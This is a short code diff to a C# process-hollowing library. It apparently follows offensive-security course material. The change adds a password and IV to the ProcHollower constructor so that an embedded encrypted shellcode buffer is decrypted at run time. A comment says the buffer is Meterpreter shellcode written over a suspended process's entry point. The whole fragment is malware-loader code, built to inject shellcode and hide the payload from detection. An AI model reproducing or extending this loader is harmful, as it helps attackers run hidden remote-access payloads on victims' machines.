@@ -94,7 +94,7 @@ namespace ProcessHollowingLib
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern uint ResumeThread(IntPtr hThread);
-        public ProcHollower()
+        public ProcHollower(string password, byte[]iv)
         {
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -179,7 +179,7 @@ namespace ProcessHollowingLib
                 0x62,0x05
             };
 
-            buf = PFuncs.CaesarDecrypt(buf);
+            buf = PFuncs.CaesarDecrypt(buf,password,iv);
 
             //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
             //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
